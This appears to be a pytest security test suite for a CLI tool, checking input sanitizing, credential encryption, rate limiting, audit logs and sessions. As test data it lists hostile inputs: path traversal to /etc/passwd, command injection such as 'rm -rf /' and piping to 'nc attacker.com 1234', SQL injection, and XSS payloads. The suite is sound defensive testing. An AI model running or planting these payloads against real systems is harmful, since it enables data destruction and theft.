"""
Comprehensive security test suite for M012 CLI Interface.

Tests input validation, credential management, rate limiting, and audit logging.
"""

import os
import json
import tempfile
import shutil
from pathlib import Path
from datetime import datetime, timedelta
import pytest
from unittest.mock import Mock, patch, MagicMock

# Import security components
from devdocai.cli.utils.security import (
    InputSanitizer, ValidationError,
    SecureCredentialManager, CredentialError,
    RateLimiter, RateLimitExceeded, RateLimitConfig,
    SecurityAuditLogger, AuditEventType, AuditSeverity,
    SecureSessionManager, UserRole, SessionError,
    SecurityValidator, PolicyViolation
)


class TestInputSanitizer:
    """Test input sanitization and validation."""
    
    def setup_method(self):
        """Setup test environment."""
        self.sanitizer = InputSanitizer(strict_mode=True)
        self.temp_dir = tempfile.mkdtemp()
        
    def teardown_method(self):
        """Cleanup test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_path_traversal_detection(self):
        """Test detection of path traversal attempts."""
        dangerous_paths = [
            '../../../etc/passwd',
            '..\\..\\windows\\system32',
            '/tmp/../../../etc/passwd',
            'files/%2e%2e%2f%2e%2e%2fetc/passwd',
            'files/..;/etc/passwd',
            'files/..%00/etc/passwd',
            '%252e%252e%252f',
        ]
        
        for path in dangerous_paths:
            with pytest.raises(ValidationError) as exc:
                self.sanitizer.sanitize_path(path)
            assert 'traversal' in str(exc.value).lower()
    
    def test_command_injection_detection(self):
        """Test detection of command injection attempts."""
        dangerous_commands = [
            'file.txt; rm -rf /',
            'file.txt && cat /etc/passwd',
            'file.txt | nc attacker.com 1234',
            '$(cat /etc/passwd)',
            '`cat /etc/passwd`',
            'file.txt\nrm -rf /',
        ]
        
        for cmd in dangerous_commands:
            with pytest.raises(ValidationError) as exc:
                self.sanitizer.sanitize_command_arg(cmd)
            assert 'dangerous' in str(exc.value).lower()
    
    def test_sql_injection_detection(self):
        """Test detection of SQL injection attempts."""
        sql_injections = [
            "'; DROP TABLE users--",
            "1' OR '1'='1",
            "admin'--",
            "1 UNION SELECT * FROM passwords",
            "'; DELETE FROM logs; --",
        ]
        
        for sql in sql_injections:
            with pytest.raises(ValidationError) as exc:
                self.sanitizer.sanitize_sql_input(sql)
            assert 'sql injection' in str(exc.value).lower()
    
    def test_xss_detection_in_json(self):
        """Test detection of XSS patterns in JSON input."""
        xss_payloads = [
            '{"data": "<script>alert(1)</script>"}',
            '{"onclick": "javascript:alert(1)"}',
            '{"html": "<iframe src=evil.com>"}',
            '{"eval": "eval(atob(\'YWxlcnQoMSk=\'))"}',
        ]
        
        for payload in xss_payloads:
            with pytest.raises(ValidationError) as exc:
                self.sanitizer.validate_json_input(payload)
            assert 'xss' in str(exc.value).lower() or 'dangerous' in str(exc.value).lower()
    
    def test_safe_path_validation(self):
        """Test validation of safe paths."""
        # Create a safe file
        safe_file = Path(self.temp_dir) / 'safe_file.txt'
        safe_file.write_text('content')
        
        # Should pass validation
        result = self.sanitizer.sanitize_path(str(safe_file), must_exist=True)
        assert result == str(safe_file.resolve())
    
    def test_filename_sanitization(self):
        """Test filename sanitization."""
        test_cases = [
            ('../../etc/passwd', 'passwd'),
            ('file<script>.txt', 'file_script_.txt'),
            ('file|command.txt', 'file_command.txt'),
            ('con.txt', pytest.raises(ValidationError)),  # Reserved name
            ('.hidden_file', pytest.raises(ValidationError)),  # Hidden file in strict mode
        ]
        
        for input_name, expected in test_cases:
            if isinstance(expected, str):
                result = self.sanitizer.sanitize_filename(input_name)
                assert result == expected
            else:
                with expected:
                    self.sanitizer.sanitize_filename(input_name)
    
    def test_json_depth_limit(self):
        """Test JSON nesting depth limits."""
        # Create deeply nested JSON
        deep_json = '{"a":' * 101 + '1' + '}' * 101
        
        with pytest.raises(ValidationError) as exc:
            self.sanitizer.validate_json_input(deep_json)
        assert 'too deep' in str(exc.value).lower()
    
    def test_prototype_pollution_prevention(self):
        """Test prevention of prototype pollution attacks."""
        dangerous_json = [
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            '{"prototype": {"isAdmin": true}}',
        ]
        
        for payload in dangerous_json:
            with pytest.raises(ValidationError) as exc:
                self.sanitizer.validate_json_input(payload)
            assert 'dangerous' in str(exc.value).lower()


class TestSecureCredentialManager:
    """Test secure credential management."""
    
    def setup_method(self):
        """Setup test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.cred_manager = SecureCredentialManager(config_dir=Path(self.temp_dir))
    
    def teardown_method(self):
        """Cleanup test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_credential_encryption(self):
        """Test credential encryption and decryption."""
        # Store credential
        self.cred_manager.store_credential(
            service='test_service',
            username='test_user',
            password='super_secret_password_123',
            metadata={'type': 'api_key'}
        )
        
        # Retrieve credential
        cred = self.cred_manager.get_credential('test_service')
        assert cred is not None
        assert cred['username'] == 'test_user'
        assert cred['password'] == 'super_secret_password_123'
        assert cred['metadata']['type'] == 'api_key'
    
    def test_credential_file_encryption(self):
        """Test that credentials are encrypted on disk."""
        # Store credential
        self.cred_manager.store_credential(
            service='test',
            username='user',
            password='password123'
        )
        
        # Read raw file
        cred_file = Path(self.temp_dir) / 'credentials.enc'
        assert cred_file.exists()
        
        with open(cred_file, 'rb') as f:
            raw_data = f.read()
        
        # Should not contain plaintext password
        assert b'password123' not in raw_data
        assert b'user' not in raw_data
    
    def test_sensitive_data_masking(self):
        """Test masking of sensitive data."""
        test_cases = [
            # API Keys
            ('My API key is sk-1234567890abcdef', 'My API key is [REDACTED_API_KEY]'),
            ('Bearer token: eyJhbGciOiJIUzI1NiIs...', 'Bearer token: [REDACTED_TOKEN]'),
            
            # AWS Keys
            ('AWS Access: AKIAIOSFODNN7EXAMPLE', 'AWS Access: [REDACTED_AWS_ACCESS_KEY]'),
            
            # Email
            ('Contact: user@example.com', 'Contact: [REDACTED_EMAIL]'),
            
            # Credit Card
            ('Card: 4111-1111-1111-1111', 'Card: [REDACTED_CARD_NUMBER]'),
            
            # SSN
            ('SSN: 123-45-6789', 'SSN: [REDACTED_SSN]'),
            
            # JWT
            ('Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U',
             'Token: [REDACTED_JWT]'),
        ]
        
        for input_text, expected in test_cases:
            result = self.cred_manager.mask_sensitive_data(input_text)
            assert expected in result or '[REDACTED' in result
    
    def test_api_key_validation(self):
        """Test API key format validation."""
        test_cases = [
            ('openai', 'sk-' + 'a' * 48, True),
            ('openai', 'invalid-key', False),
            ('anthropic', 'sk-ant-' + 'a' * 95, True),
            ('github', 'ghp_' + 'a' * 36, True),
            ('aws', 'AKIA' + 'A' * 16, True),
            ('unknown', 'some-long-key-value-here', True),
            ('unknown', 'short', False),
        ]
        
        for service, key, expected in test_cases:
            result = self.cred_manager.validate_api_key(key, service)
            assert result == expected
    
    def test_credential_deletion(self):
        """Test secure credential deletion."""
        # Store credential
        self.cred_manager.store_credential('test', 'user', 'pass')
        
        # Verify it exists
        assert self.cred_manager.get_credential('test') is not None
        
        # Delete it
        self.cred_manager.delete_credential('test')
        
        # Verify it's gone
        assert self.cred_manager.get_credential('test') is None


class TestRateLimiter:
    """Test rate limiting functionality."""
    
    def setup_method(self):
        """Setup test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.config = RateLimitConfig(
            max_requests=10,
            time_window=1,  # 1 second for faster tests
            burst_size=3,
            cooldown=2
        )
        self.limiter = RateLimiter(config=self.config, storage_dir=Path(self.temp_dir))
    
    def teardown_method(self):
        """Cleanup test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_token_bucket_rate_limiting(self):
        """Test token bucket algorithm."""
        identifier = 'test_user'
        
        # Should allow burst
        for i in range(self.config.burst_size):
            assert self.limiter.check_rate_limit(identifier, strategy='token_bucket')
        
        # Should be rate limited
        with pytest.raises(RateLimitExceeded):
            self.limiter.check_rate_limit(identifier, strategy='token_bucket')
    
    def test_sliding_window_rate_limiting(self):
        """Test sliding window algorithm."""
        identifier = 'test_user'
        
        # Should allow up to max_requests
        for i in range(self.config.max_requests):
            assert self.limiter.check_rate_limit(identifier, strategy='sliding_window')
        
        # Should be rate limited
        with pytest.raises(RateLimitExceeded):
            self.limiter.check_rate_limit(identifier, strategy='sliding_window')
    
    def test_blacklist_on_repeated_violations(self):
        """Test blacklisting for repeat offenders."""
        identifier = 'bad_user'
        
        # Trigger multiple violations
        for _ in range(3):
            # Fill up the limit
            for i in range(self.config.max_requests + 1):
                try:
                    self.limiter.check_rate_limit(identifier, strategy='fixed_window')
                except RateLimitExceeded:
                    break
        
        # Should be blacklisted
        with pytest.raises(RateLimitExceeded) as exc:
            self.limiter.check_rate_limit(identifier)
        assert 'retry after' in str(exc.value).lower()
    
    def test_rate_limit_decorator(self):
        """Test rate limiting decorator."""
        call_count = 0
        
        @self.limiter.rate_limit(
            identifier_func=lambda: 'test_func',
            strategy='fixed_window'
        )
        def test_function():
            nonlocal call_count
            call_count += 1
            return 'success'
        
        # Should allow max_requests calls
        for i in range(self.config.max_requests):
            result = test_function()
            assert result == 'success'
        
        # Should raise on excess calls
        with pytest.raises(RateLimitExceeded):
            test_function()
        
        assert call_count == self.config.max_requests
    
    def test_quota_checking(self):
        """Test remaining quota calculation."""
        identifier = 'quota_user'
        
        # Initial quota
        remaining, reset = self.limiter.get_remaining_quota(identifier, 'token_bucket')
        assert remaining == self.config.burst_size
        
        # Use some quota
        self.limiter.check_rate_limit(identifier, strategy='token_bucket')
        
        # Check reduced quota
        remaining, reset = self.limiter.get_remaining_quota(identifier, 'token_bucket')
        assert remaining == self.config.burst_size - 1


class TestSecurityAuditLogger:
    """Test security audit logging."""
    
    def setup_method(self):
        """Setup test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.logger = SecurityAuditLogger(
            log_dir=Path(self.temp_dir),
            enable_compression=False,
            enable_chain=True
        )
    
    def teardown_method(self):
        """Cleanup test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_audit_event_logging(self):
        """Test logging of audit events."""
        # Log various events
        events = [
            (AuditEventType.AUTH_SUCCESS, AuditSeverity.INFO, {'user': 'test'}),
            (AuditEventType.ACCESS_DENIED, AuditSeverity.WARNING, {'resource': '/admin'}),
            (AuditEventType.SECURITY_VIOLATION, AuditSeverity.CRITICAL, {'attack': 'sql_injection'}),
        ]
        
        for event_type, severity, details in events:
            event = self.logger.log_event(
                event_type=event_type,
                severity=severity,
                details=details
            )
            assert event.event_type == event_type
            assert event.severity == severity
    
    def test_audit_log_integrity(self):
        """Test hash chain integrity verification."""
        # Log some events
        for i in range(5):
            self.logger.log_event(
                event_type=AuditEventType.COMMAND_EXECUTED,
                severity=AuditSeverity.INFO,
                details={'command': f'test_{i}'}
            )
        
        # Verify integrity
        assert self.logger.verify_integrity() == True
    
    def test_audit_log_tamper_detection(self):
        """Test detection of tampered logs."""
        # Log events
        self.logger.log_event(
            event_type=AuditEventType.DATA_WRITE,
            severity=AuditSeverity.INFO,
            details={'file': 'test.txt'}
        )
        
        # Tamper with log file
        log_file = list(Path(self.temp_dir).glob('audit_*.log'))[0]
        
        with open(log_file, 'r') as f:
            lines = f.readlines()
        
        # Modify an event
        if lines:
            event = json.loads(lines[0])
            event['user'] = 'hacker'  # Tamper with user field
            lines[0] = json.dumps(event) + '\n'
        
        with open(log_file, 'w') as f:
            f.writelines(lines)
        
        # Integrity check should fail
        assert self.logger.verify_integrity() == False
    
    def test_sensitive_data_sanitization(self):
        """Test that sensitive data is sanitized in logs."""
        # Log event with sensitive data
        event = self.logger.log_event(
            event_type=AuditEventType.CONFIG_CHANGE,
            severity=AuditSeverity.INFO,
            details={
                'password': 'secret123',
                'api_key': 'sk-1234567890',
                'normal_field': 'visible'
            }
        )
        
        # Check sanitization
        assert event.details['password'] == '[REDACTED]'
        assert event.details['api_key'] == '[REDACTED]'
        assert event.details['normal_field'] == 'visible'
    
    def test_audit_search(self):
        """Test searching audit events."""
        # Log various events
        self.logger.log_event(
            event_type=AuditEventType.AUTH_SUCCESS,
            severity=AuditSeverity.INFO,
            details={'user': 'alice'}
        )
        self.logger.log_event(
            event_type=AuditEventType.AUTH_FAILURE,
            severity=AuditSeverity.WARNING,
            details={'user': 'bob'}
        )
        self.logger.log_event(
            event_type=AuditEventType.ACCESS_DENIED,
            severity=AuditSeverity.ERROR,
            details={'user': 'charlie'}
        )
        
        # Search by event type
        auth_events = self.logger.search_events(event_type=AuditEventType.AUTH_SUCCESS)
        assert len(auth_events) == 1
        assert auth_events[0].details['user'] == 'alice'
        
        # Search by severity
        warning_events = self.logger.search_events(severity=AuditSeverity.WARNING)
        assert len(warning_events) == 1
        assert warning_events[0].details['user'] == 'bob'


class TestSecureSessionManager:
    """Test secure session management."""
    
    def setup_method(self):
        """Setup test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.session_manager = SecureSessionManager(
            session_dir=Path(self.temp_dir),
            session_timeout=60,
            max_sessions_per_user=2
        )
    
    def teardown_method(self):
        """Cleanup test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_session_creation(self):
        """Test session creation and validation."""
        # Create session
        session_id = self.session_manager.create_session(
            user='test_user',
            role=UserRole.DEVELOPER,
            metadata={'ip': '127.0.0.1'}
        )
        
        assert session_id is not None
        assert len(session_id) > 20  # Should be secure random token
        
        # Validate session
        session = self.session_manager.validate_session(session_id)
        assert session is not None
        assert session.user == 'test_user'
        assert session.role == UserRole.DEVELOPER
        assert session.metadata['ip'] == '127.0.0.1'
    
    def test_session_expiration(self):
        """Test session expiration."""
        # Create session with short timeout
        manager = SecureSessionManager(
            session_dir=Path(self.temp_dir) / 'exp',
            session_timeout=0  # Immediate expiration
        )
        
        session_id = manager.create_session('user', UserRole.VIEWER)
        
        # Should be expired immediately
        session = manager.validate_session(session_id)
        assert session is None
    
    def test_concurrent_session_limit(self):
        """Test enforcement of concurrent session limits."""
        # Create maximum allowed sessions
        sessions = []
        for i in range(self.session_manager.max_sessions_per_user):
            session_id = self.session_manager.create_session(
                user='same_user',
                role=UserRole.VIEWER
            )
            sessions.append(session_id)
        
        # All sessions should be valid
        for session_id in sessions:
            assert self.session_manager.validate_session(session_id) is not None
        
        # Creating one more should terminate the oldest
        new_session = self.session_manager.create_session(
            user='same_user',
            role=UserRole.VIEWER
        )
        
        # Oldest session should be terminated
        assert self.session_manager.validate_session(sessions[0]) is None
        
        # Newer sessions should still be valid
        assert self.session_manager.validate_session(sessions[1]) is not None
        assert self.session_manager.validate_session(new_session) is not None
    
    def test_permission_checking(self):
        """Test role-based permission checking."""
        # Create sessions with different roles
        admin_session = self.session_manager.create_session('admin', UserRole.ADMIN)
        dev_session = self.session_manager.create_session('dev', UserRole.DEVELOPER)
        viewer_session = self.session_manager.create_session('viewer', UserRole.VIEWER)
        
        # Test permissions
        assert self.session_manager.check_permission(admin_session, 'security.write') == True
        assert self.session_manager.check_permission(dev_session, 'security.write') == False
        assert self.session_manager.check_permission(dev_session, 'generate.write') == True
        assert self.session_manager.check_permission(viewer_session, 'generate.write') == False
        assert self.session_manager.check_permission(viewer_session, 'generate.read') == True
    
    def test_session_rotation(self):
        """Test session token rotation."""
        # Create session
        old_session_id = self.session_manager.create_session('user', UserRole.DEVELOPER)
        
        # Rotate token
        new_session_id = self.session_manager.rotate_session_token(old_session_id)
        
        assert new_session_id is not None
        assert new_session_id != old_session_id
        
        # Old session should be invalid
        assert self.session_manager.validate_session(old_session_id) is None
        
        # New session should be valid
        session = self.session_manager.validate_session(new_session_id)
        assert session is not None
        assert session.user == 'user'


class TestSecurityValidator:
    """Test security validation and policy enforcement."""
    
    def setup_method(self):
        """Setup test environment."""
        self.validator = SecurityValidator()
    
    def test_command_injection_validation(self):
        """Test command injection validation rules."""
        dangerous_inputs = [
            'file.txt; cat /etc/passwd',
            '$(whoami)',
            '`id`',
            'file && ls',
            'file || rm -rf /',
        ]
        
        for input_data in dangerous_inputs:
            violations = self.validator.validate(input_data)
            assert len(violations) > 0
            assert any('command injection' in v['description'].lower() for v in violations)
    
    def test_path_traversal_validation(self):
        """Test path traversal validation rules."""
        dangerous_paths = [
            '../../../etc/passwd',
            '..\\windows\\system32',
            '%2e%2e%2f',
        ]
        
        for path in dangerous_paths:
            violations = self.validator.validate(path)
            assert len(violations) > 0
            assert any('path traversal' in v['description'].lower() for v in violations)
    
    def test_strict_validation(self):
        """Test strict validation that raises on violations."""
        dangerous_input = "'; DROP TABLE users--"
        
        with pytest.raises(PolicyViolation) as exc:
            self.validator.validate_strict(dangerous_input)
        assert 'security violation' in str(exc.value).lower()
    
    def test_compliance_checking(self):
        """Test security compliance checking."""
        # Check OWASP compliance
        report = self.validator.check_compliance('OWASP')
        
        # Should have required rules
        assert report['standard'] == 'OWASP'
        assert isinstance(report['compliant'], bool)
        
        # Check for violations or recommendations
        if not report['compliant']:
            assert len(report['violations']) > 0


class TestIntegration:
    """Integration tests for security features."""
    
    def setup_method(self):
        """Setup test environment."""
        self.temp_dir = tempfile.mkdtemp()
    
    def teardown_method(self):
        """Cleanup test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('click.echo')
    def test_secure_command_execution(self, mock_echo):
        """Test secure command execution with all security features."""
        from devdocai.cli.main_secure import cli
        from click.testing import CliRunner
        
        runner = CliRunner()
        
        # Test command with potential injection
        result = runner.invoke(cli, ['init', '--template', '../../../etc/passwd'])
        
        # Should fail due to validation
        assert result.exit_code != 0
        assert 'invalid' in result.output.lower() or 'error' in result.output.lower()
    
    def test_rate_limiting_integration(self):
        """Test rate limiting integration with commands."""
        from devdocai.cli.commands.generate_secure import rate_limiter
        
        user = 'test_user'
        
        # Simulate rapid command execution
        for i in range(50):
            try:
                rate_limiter.check_command_limit('generate', user)
            except RateLimitExceeded:
                # Should be rate limited before 50 calls
                assert i < 50
                break
        else:
            pytest.fail("Rate limiting did not trigger")
    
    def test_audit_logging_integration(self):
        """Test that commands generate audit logs."""
        logger = SecurityAuditLogger(log_dir=Path(self.temp_dir))
        
        # Log command execution
        logger.log_event(
            event_type=AuditEventType.COMMAND_EXECUTED,
            severity=AuditSeverity.INFO,
            details={'command': 'generate', 'args': ['file.py']}
        )
        
        # Verify log exists
        log_files = list(Path(self.temp_dir).glob('audit_*.log'))
        assert len(log_files) > 0
        
        # Verify content
        with open(log_files[0], 'r') as f:
            log_content = f.read()
            assert 'generate' in log_content
            assert 'file.py' in log_content


if __name__ == '__main__':
    pytest.main([__file__, '-v'])